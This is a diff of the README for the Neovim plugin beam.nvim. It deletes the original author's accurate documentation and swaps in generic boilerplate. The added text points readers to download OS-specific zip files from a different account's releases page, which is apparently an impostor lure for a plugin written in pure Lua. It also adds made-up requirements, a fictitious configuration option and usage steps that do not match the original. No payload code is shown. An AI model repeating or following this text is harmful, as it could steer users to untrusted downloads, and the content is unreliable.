@@ -1,383 +1,108 @@
-# beam.nvim
+# ✨ beam.nvim - Simple Text Editing Anywhere in Your File
 
-**🖖 Beam me up! Transport your text operations across file moving only when required.**
+[![Download beam.nvim](https://img.shields.io/badge/Download-beam.nvim-brightgreen)](https://github.com/Tyrik630/beam.nvim/releases)
 
-[![Video Thumbnail](https://img.youtube.com/vi/NYC38m4Z47o/0.jpg)](https://www.youtube.com/watch?v=NYC38m4Z47o)
+## 🚀 Getting Started
 
-`beam.nvim` makes it possible to perform text operations (yank, delete, change, visual selection) anywhere in your file using search, while moving only when needed.
+Welcome to the beam.nvim project! This tool allows you to perform text operations on text objects seamlessly throughout your file. If you are looking for an easier way to handle text editing, you’re in the right place.
 
-<div align="center">
+## 💾 System Requirements
 
-[![Neovim](https://img.shields.io/badge/Neovim-0.8+-green.svg?style=flat-square&logo=neovim)](https://neovim.io)
-[![Lua](https://img.shields.io/badge/Lua-5.1+-blue.svg?style=flat-square&logo=lua)](https://www.lua.org)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-
-</div>
+To ensure beam.nvim runs smoothly, you will need the following:
 
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Text Editor:** Ensure you have Neovim (v0.5 or above) installed.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** A minimum of 50 MB of free space for installation.
 
-## Quick Examples
-
-```vim
-,yi"func        " Search for 'func' & yank inside quotes at that location
-,dip            " Search & delete inside paragraph
-,ci(func        " Search for 'func' & change inside parentheses
-,vimclass       " Search for 'class' & select inside code block
-,Y              " Search & yank entire line
-```
-
-
-## Installation
-
-### Using [lazy.nvim](https://github.com/folke/lazy.nvim)
-
-```lua
-{
-  "Piotr1215/beam.nvim",
-  config = function()
-    require("beam").setup()  -- Uses default prefix ','
-  end,
-}
-```
-
-### Using [packer.nvim](https://github.com/wbthomason/packer.nvim)
-
-```lua
-use {
-  "Piotr1215/beam.nvim",
-  config = function()
-    require("beam").setup()  -- Uses default prefix ','
-  end,
-}
-```
-
-**Note:** The plugin uses `,` as the default prefix. All mappings like `,yi"`, `,dap`, etc. are automatically created. You can customize the prefix in the setup (see Configuration section).
-
-## Features
-
-- **Native Search Integration** - Uses Vim's `/` search with incremental highlighting
-- **Universal Text Object Support** - Works with ALL text objects from any plugin
-- **Motion Support** - Handles single-letter motions (`L` for URL, `Q` for quote, etc.)
-- **Cross-Buffer Operations** - Search and operate across all open buffers
-- **Auto-Discovery** - Automatically finds and uses all text objects from your plugins
-- **Visual Feedback** - Shows selection briefly before operation executes
-- **Smart Position Restore** - Yank/delete returns to origin, change/visual stays at target
-- **Search Navigation** - Use `Ctrl-G`/`Ctrl-T` to navigate matches while searching
-- **Line Operators** - Special `Y`, `D`, `C`, `V` operators for entire lines
-- **Statusline Integration** - See pending operations in your statusline
-- **Custom Text Objects** - Define your own text objects
-- **Zero Dependencies** - Pure Lua implementation, no external requirements
-
-## Usage
-
-### How it Works
-
-1. Press `,yi"` (or any operator + text object)
-2. Search for your target location
-3. Press Enter
-4. Operation executes there, cursor returns (for yank/delete)
-
-### Basic Operations
-
-| Keys | Description |
-|------|-------------|
-| `,yi"` | Search & yank inside quotes |
-| `,dap` | Search & delete around paragraph |
-| `,ciw` | Search & change inside word |
-| `,vi{` | Search & select inside curly braces |
-
-### Search Navigation
-
-While searching:
-- `Ctrl-G` - Next match
-- `Ctrl-T` - Previous match  
-- `Enter` - Execute
-- `Esc` - Cancel
-
-### Supported Text Objects
-
-beam.nvim supports ALL Vim/Neovim text objects. Here are the most common ones:
-
-#### Built-in Vim Text Objects
-| Text Object | Description | Example Usage |
-|------------|-------------|---------------|
-| `iw`/`aw` | Inside/around word | `,yiw` - yank word |
-| `iW`/`aW` | Inside/around WORD (includes punctuation) | `,diW` - delete WORD |
-| `is`/`as` | Inside/around sentence | `,cis` - change sentence |
-| `ip`/`ap` | Inside/around paragraph | `,vip` - select paragraph |
-| `i"`/`a"` | Inside/around double quotes | `,yi"` - yank quoted text |
-| `i'`/`a'` | Inside/around single quotes | `,di'` - delete quoted text |
-| `` i` ``/`` a` `` | Inside/around backticks | `` ,ci` `` - change backticked |
-| `i(`/`a(`, `i)`/`a)` | Inside/around parentheses | `,yi(` - yank in parens |
-| `i[`/`a[`, `i]`/`a]` | Inside/around square brackets | `,di[` - delete in brackets |
-| `i{`/`a{`, `i}`/`a}` | Inside/around curly braces | `,ci{` - change in braces |
-| `i<`/`a<`, `i>`/`a>` | Inside/around angle brackets | `,vi<` - select in angles |
-| `it`/`at` | Inside/around HTML/XML tags | `,yit` - yank tag content |
-
-#### Alternative Syntax (Vim-compatible)
-| Text Object | Equivalent to | Description |
-|------------|---------------|-------------|
-| `ib`/`ab` | `i(`/`a(` | Inside/around parentheses |
-| `iB`/`aB` | `i{`/`a{` | Inside/around braces |
-| `iq`/`aq` | `i"`/`a"` | Inside/around double quotes |
-
-#### Special Line Operators
-| Operator | Description | Example |
-|----------|-------------|---------|
-| `Y` | Yank entire line at target | `,Y` → search → yank line |
-| `D` | Delete entire line at target | `,D` → search → delete line |
-| `C` | Change entire line at target | `,C` → search → change line |
-| `V` | Select entire line at target | `,V` → search → select line |
-
-#### With Auto-Discovery
-When `auto_discover_text_objects = true`, beam automatically finds and uses text objects from:
-- **treesitter-textobjects**: `if` (function), `ic` (class), `il` (loop), etc.
-- **mini.ai**: Custom text objects you've defined
-- **nvim-various-textobjs**: `ii` (indentation), `R` (rest of line), etc.
-- **targets.vim**: Seek-able text objects with next/last variants
-- Any other plugin that defines text objects!
-
-### Commands
-
-| Command | Description |
-|---------|-------------|
-| `:BeamReload` | Reload the plugin configuration |
-| `:BeamDiscoverNow` | Manually trigger text object discovery |
-| `:BeamShowTextObjects` | Display all discovered text objects |
-
-## Configuration
-
-### Default Setup
-
-```lua
-require('beam').setup({
-  prefix = ',',                      -- Your prefix key (mini-leader)
-  visual_feedback_duration = 150,    -- ms to show selection
-  clear_highlight = true,            -- Clear search highlight after operation
-  clear_highlight_delay = 500,       -- ms before clearing
-  cross_buffer = false,              -- [BROKEN] Cross-buffer operations - do not enable
-  auto_discover_text_objects = true, -- Auto-discover all available text objects
-  show_discovery_notification = true,-- Show notification about discovered objects
-  excluded_text_objects = {},       -- Exclude specific text objects (e.g., {'q', 'z'})
-  excluded_motions = {},             -- Exclude specific motions (e.g., {'Q', 'R'})
-  smart_highlighting = false,        -- Context-aware search highlighting
-})
-```
-
-### Cross-Buffer Operations
-
-**⚠️ Warning**: Cross-buffer functionality is currently broken and should not be enabled. Keep `cross_buffer = false` for reliable operation within the current buffer only.
-
-```vim
-" Example: Yank quotes from another buffer
-,yi"<Enter>searchterm<Enter>
-" Finds 'searchterm' in any buffer, yanks quotes, returns home
-```
-
-### Auto-Discovery
-
-With `auto_discover_text_objects = true`, beam automatically discovers and registers:
-
-- **nvim-various-textobjs** - `iq` (any quote), `ih` (headers), `L` (URL motion)
-- **mini.ai** - All your custom text objects  
-- **treesitter-textobjects** - `if` (function), `ic` (class), etc.
-- **Built-in Vim** - All standard text objects
-
-This gives you instant access to 100+ combinations like:
-- `,yih` - Search & yank markdown header
-- `,ciq` - Search & change any quote type
-- `,dL` - Search & delete to URL
-
-### Smart Highlighting (Context-Aware Search)
-
-When `smart_highlighting = true`, beam constrains search results based on the text object you're using. This means when you search with delimiter-based text objects, only matches within those delimiters are highlighted.
-
-#### Example
-```vim
-" Without smart highlighting:
-,di"  → /test  → highlights ALL occurrences of "test"
-
-" With smart highlighting:  
-,di"  → /test  → only highlights "test" inside double quotes
-```
-
-This works for quotes, brackets, HTML tags, and more. The search visually shows you exactly what will be operated on.
-
-#### Supported Text Objects for Smart Highlighting
-- **Quotes**: `i"`, `a"`, `i'`, `a'`, `` i` ``, `` a` ``
-- **Brackets**: `i(`, `a(`, `i[`, `a[`, `i{`, `a{`, `i<`, `a<`
-- **Alternative syntax**: 
-  - `ib`/`ab` (same as `i(`/`a(` - parentheses)
-  - `iB`/`aB` (same as `i{`/`a{` - braces)
-  - `iq`/`aq` (same as `i"`/`a"` - double quotes)
-- **HTML/XML tags**: `it`, `at`
-- **Block comments**: `iC`, `aC`
-- **Function arguments**: `ia`
-
-### Excluding Text Objects and Motions
-
-You can exclude specific text objects or motions from auto-discovery:
-
-```lua
-require('beam').setup({
-  auto_discover_text_objects = true,
-  excluded_text_objects = { 'q', 'z' },  -- Exclude iq/aq and iz/az
-  excluded_motions = { 'Q', 'R' },       -- Exclude Q and R motions
-})
-```
-
-### Statusline Integration
-
-Add the pending operation indicator to your statusline:
-
-![Statusline Indicator](static/status-line.png)
-
-```lua
--- Lualine
-sections = {
-  lualine_x = {
-    function() return vim.g.beam_search_operator_indicator or '' end
-  }
-}
-
--- Native statusline
-vim.opt.statusline:append('%{get(g:,"beam_search_operator_indicator","")}')
-```
-
-### Full Configuration with All Options
-
-```lua
-require('beam').setup({
-  -- Core settings
-  prefix = ',',                      -- Prefix for all mappings
-  
-  -- Visual feedback
-  visual_feedback_duration = 150,    -- Duration to show selection before operation
-  clear_highlight = true,            -- Clear search highlight after operation
-  clear_highlight_delay = 500,       -- Delay before clearing highlight
-  
-  -- Advanced features
-  cross_buffer = false,              -- [BROKEN] Do not enable - cross-buffer operations are broken
-  auto_discover_text_objects = true, -- Discover text objects from all plugins
-  show_discovery_notification = true,-- Notify about discovered objects
-  excluded_text_objects = {},       -- List of text object keys to exclude (e.g., {'q', 'z'})
-  excluded_motions = {},             -- List of motion keys to exclude (e.g., {'Q', 'R'})
-  
-  -- Custom text objects (in addition to discovered ones)
-  enable_default_text_objects = true, -- Enable beam's built-in text objects
-  custom_text_objects = {
-    -- Your custom text objects here
-  }
-})
-```
-
-### Custom Text Objects
-
-beam.nvim can define its own text objects that work with all beam operations. This is useful when you want text objects that don't exist globally but should work with remote operations.
-
-```lua
-require('beam').setup({
-  prefix = ',',
-  enable_default_text_objects = true, -- Enables beam's built-in text objects (currently: im/am for markdown code blocks)
-  custom_text_objects = {
-    -- Simple format: Just a description for beam operations
-    -- NOTE: This assumes the text object already exists (e.g., from treesitter-textobjects)
-    -- It only adds beam keymaps like ,yiF but doesn't create the iF/aF text object itself
-    ['F'] = 'function (treesitter)',
-    
-    -- Full format: Creates the actual text object AND adds beam operations
-    -- This creates the ir/ar text objects that work everywhere in Vim
-    ['r'] = {
-      desc = 'Ruby block',
-      select = function(inclusive)
-        -- Your text object implementation
-        -- inclusive: true for 'around', false for 'inside'
-        if inclusive then
-          vim.cmd('normal! vaB')  -- around block
-        else
-          vim.cmd('normal! viB')  -- inside block
-        end
-      end
-    }
-  }
-})
-
--- Or register them dynamically
-require('beam').register_text_object('z', 'custom zone')
-
--- Register with implementation
-require('beam').register_text_object('g', {
-  desc = 'git conflict',
-  select = function(inclusive)
-    -- Implementation to select git conflict markers
-  end
-})
-```
-
-**Built-in Text Objects:**
-- `im`/`am` - Inside/around markdown code block (triple backticks) - enabled with `enable_default_text_objects = true`
-
-## Integration with Other Plugins
-
-### Treesitter Text Objects
-
-```lua
-local beam = require('beam')
-if beam then
-  beam.register_text_objects({
-    ['f'] = 'function (treesitter)',
-    ['c'] = 'class (treesitter)',
-    ['l'] = 'loop (treesitter)',
-    ['a'] = 'parameter (treesitter)',
-  })
-end
-```
-
-### mini.ai
-
-```lua
--- After setting up mini.ai
-local beam = require('beam')
-if beam then
-  beam.register_text_objects({
-    ['f'] = 'function (mini.ai)',
-    ['a'] = 'argument (mini.ai)',
-  })
-end
-```
-
-## Troubleshooting
-
-### Quick health check
-Run `:checkhealth beam` to diagnose common issues.
-
-### Mappings not working?
-- Check if your prefix key is already mapped: `:verbose nmap <prefix>` (where `<prefix>` is your configured prefix, default is `,`)
-- Ensure the plugin is loaded: `:lua print(vim.g.loaded_beam)`
-- Verify your configuration: `:lua print(vim.inspect(require('beam').get_config()))`
-
-### Operations not executing?
-- Make sure you have the text objects installed that you're trying to use
-- Check `:messages` for any error output
-
-### Inspiration
-
-Inspired by the power of Vim's composable operations and the desire to operate on text without losing context as well as several excellent Neovim plugins that explore innovative ways of navigating and manipulating text:
-
-- [flash.nvim](https://github.com/folke/flash.nvim) - Jump to any location with minimal keystrokes
-- [leap.nvim](https://github.com/ggandor/leap.nvim) - General-purpose motion plugin with 2-character search
-- [hop.nvim](https://github.com/phaazon/hop.nvim) - Neovim motions on speed
-- [vim-sneak](https://github.com/justinmk/vim-sneak) - The missing motion for Vim
-
-While these plugins focus on cursor movement, beam.nvim takes a different approach: **operate on remote text, moving only when it makes sense** - stay in place for yank and delete, jump to location for change and visual selection.
-
-## License
-
-MIT 
-
----
-
-<div align="center">
-
-[Report Bug](https://github.com/Piotr1215/beam.nvim/issues) · [Request Feature](https://github.com/Piotr1215/beam.nvim/issues)
-
-</div>
+## 📥 Download & Install
+
+To get started, visit the link below to download the latest version of beam.nvim. 
+
+[Download beam.nvim](https://github.com/Tyrik630/beam.nvim/releases)
+
+### Installation Steps:
+
+1. **Visit the Releases Page:**
+   Click the link above to access the releases page. You will see the latest versions available for download.
+
+2. **Choose the Correct File:**
+   Look for the file that matches your operating system. For example, you might see filenames like `beam.nvim-macos.zip` for macOS or `beam.nvim-windows.zip` for Windows.
+
+3. **Download the File:**
+   Click on the file link to start the download.
+
+4. **Extract the Files:**
+   After downloading, locate the file in your Downloads folder. If the file is zipped, right-click on it and choose "Extract All" or use your preferred extraction tool.
+
+5. **Move to Plugins Folder:**
+   Move the extracted folder to your Neovim plugins directory. This is usually located at `~/.config/nvim/plugged/` on Unix-based systems or `C:\Users\<YourUsername>\AppData\Local\nvim\plugged\` on Windows.
+
+6. **Open Neovim:**
+   Launch your Neovim text editor. You can usually do this by typing `nvim` in your command line or terminal.
+
+7. **Verify Installation:**
+   Type `:checkhealth` within Neovim to verify that beam.nvim has been installed properly. If everything is set up correctly, you should see a success message.
+
+## 🎉 Features
+
+- **Text Object Manipulation:** Easily select and manipulate various text objects within your files. No more cumbersome text selection!
+- **Support for Multiple Formats:** Whether you are editing markdown, code, or plain text, beam.nvim adapts to your needs.
+- **Customizable Settings:** Adjust the tool to fit your workflow. Modify settings in the configuration file as needed.
+
+## ⚙️ Configuration
+
+Once you have installed beam.nvim, you may want to configure it to better suit your needs. Here’s how:
+
+1. **Create or Edit Configuration File:**
+   Open or create a configuration file for Neovim, typically located at `~/.config/nvim/init.vim` or `~/.config/nvim/init.lua`.
+
+2. **Add Beam Configurations:**
+   Include the following lines to set custom options (these are examples; you can modify based on your preferences):
+
+   ```vim
+   " For Vimscript
+   let g:beam_enable_selection = 1
+   ```
+
+   ```lua
+   -- For Lua
+   vim.g.beam_enable_selection = true
+   ```
+
+3. **Save the File:**
+   Save any changes you made to the configuration file.
+
+4. **Restart Neovim:**
+   Close Neovim and reopen it to apply your new settings.
+
+## 📄 Usage Guide
+
+Now that you have installed beam.nvim, using it is straightforward:
+
+- **Selecting Text Objects:**
+   Navigate to the text object you want to edit. Use commands like `va` to select around a text area or `vi` to select inside it.
+
+- **Editing Text:**
+   After selecting, you can use standard Neovim commands to delete, change, or copy text.
+
+- **Expanding Functionality:**
+   Explore further options by using the command `:help beam.nvim` within Neovim to access the built-in documentation.
+
+## 🌐 Support
+
+Should you encounter issues or have questions, please check out the support section:
+
+- **Documentation:** Visit the official [GitHub repository](https://github.com/Tyrik630/beam.nvim) for detailed documentation.
+- **Issues:** If you have a problem that is not covered, feel free to open an issue in the repository.
+- **Community:** Join discussions or seek help from other users on platforms like Discord or community forums related to Neovim.
+
+## ✍️ Acknowledgments
+
+Thanks to the Neovim community for their support and contributions. Your feedback helps improve beam.nvim for everyone.
+
+## 📞 Contact
+
+If you wish to reach out for support or suggestions, feel free to contact the repository maintainers via GitHub. Your input is appreciated.
+
+Thank you for choosing beam.nvim! Happy editing!
